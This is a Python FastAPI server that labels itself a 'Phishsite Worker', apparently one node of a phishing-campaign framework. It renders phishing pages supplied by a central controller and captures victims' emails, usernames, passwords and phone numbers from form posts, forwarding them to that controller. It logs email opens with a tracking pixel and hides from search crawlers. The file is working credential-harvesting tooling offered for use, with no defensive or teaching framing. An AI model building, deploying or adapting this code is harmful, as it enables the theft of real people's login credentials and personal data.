from fastapi import FastAPI, Form, Request
from fastapi.responses import (HTMLResponse,
                               PlainTextResponse,
                               Response, RedirectResponse)
from datetime import datetime, timedelta
import uvicorn
import jwt
from httpx import AsyncClient
import json
import jinja2
import sys
import logging


FORMAT = "%(levelname)s:     %(message)s"
logging.basicConfig(format=FORMAT, level=logging.DEBUG)
logger = logging.getLogger(__name__)

app = FastAPI()

API = 'http://127.0.0.1:60502/workers'
SECRET = None
ID = None
environment = jinja2.Environment()


@app.get("/", response_class=HTMLResponse)
async def index(ref: str | None = None):
    if not ref:
        return HTMLResponse(status_code=404)
    body = await emit_event('click', ref)
    if body:
        try:
            template = environment.from_string(body['html'])
            return template.render()
        except Exception as e:
            print(e)
    return HTMLResponse(status_code=404)


@app.post("/", response_class=RedirectResponse)
async def index(ref: str | None = None, email: str = Form(None),
                username: str = Form(None), password: str = Form(None),
                phomenumber: str = Form(None)):
    if not ref:
        return RedirectResponse("/", status_code=303)
    t = dict()
    if email:
        t['email'] = email
    if username:
        t['username'] = username
    if password:
        t['password'] = password
    if phomenumber:
        t['phomenumber'] = phomenumber
    data = json.dumps(t)
    body = await emit_event(event_type='submit', ref=ref, payload=data)
    if body:
        return RedirectResponse(body['redirect_url'], status_code=303)
    return RedirectResponse("/", status_code=303)


@app.get(
    "/image/dot.png",
    responses={
        200: {
            "content": {"image/png": {}}
        }
    },
    response_class=Response
)
async def get_image(ref: str | None = None):
    dot = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x12t\x00\x00\x12t\x01\xdef\x1fx\x00\x00\x00\x0cIDAT\x18Wc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa75\x81\x84\x00\x00\x00\x00IEND\xaeB`\x82'
    if not ref:
        return Response(status_code=404)
    body = await emit_event(event_type='open', ref=ref)
    if body and body['success']:
        return Response(content=dot, media_type="image/png")
    return Response(status_code=404)


@app.get(
    "/image/Logo.png",
    responses={
        200: {
            "content": {"image/png": {}}
        }
    },
    response_class=Response
)
async def get_image(ref: str | None = None):
    dot = b'\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00\x01sRGB\x00\xae\xce\x1c\xe9\x00\x00\x00\x04gAMA\x00\x00\xb1\x8f\x0b\xfca\x05\x00\x00\x00\tpHYs\x00\x00\x12t\x00\x00\x12t\x01\xdef\x1fx\x00\x00\x00\x0cIDAT\x18Wc\xf8\xff\xff?\x00\x05\xfe\x02\xfe\xa75\x81\x84\x00\x00\x00\x00IEND\xaeB`\x82'
    return Response(content=dot, media_type="image/png")


@app.get("/robots.txt", response_class=PlainTextResponse)
def robots():
    return 'User-agent: *\nDisallow: /'


@app.post('/ping', status_code=201)
async def ping(req: Request):
    try:
        body = await req.json()
        print(body)
        if validate_token(body['ref_key']):
            return {'ref_key': body['ref_key'],
                    'pong': body['ping']}
    except Exception as e:
        print(e)
    return Response(status_code=404)


def create_token():
    return jwt.encode({"id": ID,
                       "exp": datetime.utcnow() + timedelta(minutes=3)},
                      SECRET, algorithm="HS256")


def validate_token(ref_key: str):
    try:
        data = jwt.decode(ref_key, SECRET, algorithms=["HS256"])
        print(ID, data['id'])
        if data['id'] == ID:
            return True
    except Exception as e:
        print(e)
    return False


async def emit_event(event_type: str, ref, payload: str | None = None):
    async with AsyncClient() as client:
        try:
            token = create_token()
            res = await client.post(API, headers={'Authorization': f'Bearer {token}'}, json={'ref_key': ref[:4], 'ref_id': ref[4:],
                                                                                             'event_type': event_type, 'payload': payload})
            if res.status_code == 200:
                return res.json()
        except Exception as e:
            print(e)
    return

if __name__ == "__main__":
    if len(sys.argv) == 5:
        host = sys.argv[1]
        port = sys.argv[2]
        sect = sys.argv[3]
        idd = sys.argv[4]
    else:
        host = input('HOST IP (0.0.0.0): ')
        port = input('HOST PORT (8080): ')
        sect = input('SECRET ("helloworld"): ')
        idd = input("Worker ID (1): ")
    if not host:
        host = '0.0.0.0'
    if not port:
        port = 8080
    else:
        port = int(port)
    if sect:
        SECRET = sect
    else:
        SECRET = 'helloworld'
    if idd:
        ID = int(idd)
    else:
        ID = 1

    logger.info(
        f"Phishsite Worker ID:{ID} SECRET:{SECRET[0]+'*'*(len(SECRET)-1)}")
    uvicorn.run(app, host=host, port=port)